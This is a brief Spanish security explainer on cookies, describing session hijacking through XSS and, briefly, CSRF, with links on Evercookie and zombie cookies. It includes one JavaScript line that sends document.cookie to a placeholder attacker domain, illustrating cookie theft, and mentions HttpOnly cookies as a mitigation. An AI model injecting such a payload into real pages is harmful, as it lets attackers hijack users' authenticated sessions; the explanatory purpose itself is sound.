# Seguridad

#### Robos de sesiones y XSS

Las cookies son frecuentemente usadas para identificar a usuarios y sus sesiones autenticadas. Por lo que robar una cookie podría significar robar la sesión de un usuario. Una forma comun de robar cookies es aprovechando la vulnerabilidad XSS de la aplicación.

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

Los **cookies HttpOnly** pueden ayudar a mitigar este ataque ya que impiden el acceso al valor de las cookies mediante código Javascript.

#### Cross-site qurest forgery (CSRF)

O falsificación de petición en sitios cruzados. Este ataque fuerza al navegador web de su víctima, validado en algún servicio a enviar una petición a una aplicación web vulnerable.

* [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
* [Zombie cookies on Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)
